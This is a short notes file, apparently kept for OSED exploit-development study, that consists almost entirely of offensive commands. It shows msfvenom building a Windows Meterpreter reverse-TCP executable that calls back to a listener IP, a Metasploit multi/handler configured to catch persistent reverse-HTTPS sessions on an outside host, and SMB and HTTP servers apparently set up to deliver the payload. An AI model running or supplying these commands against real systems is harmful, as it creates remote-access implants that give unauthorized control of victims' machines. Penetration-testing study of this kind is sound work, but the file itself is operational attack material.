# x86Win-OSED-Notes

met payload:
```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.178 LPORT=4343 -f exe -o met.exe

# Exploit after met.exe execution
$ msfconsole
msf> use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_https
msf exploit(handler) > set LHOST consulting.example.org
msf exploit(handler) > set LPORT 4443
msf exploit(handler) > set SessionCommunicationTimeout 0
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > exploit -j
```

smbserver:
```
sudo smbserver.py met /home/kali/ -smb2support
```

http-server:
```
python3 -m http.server
```
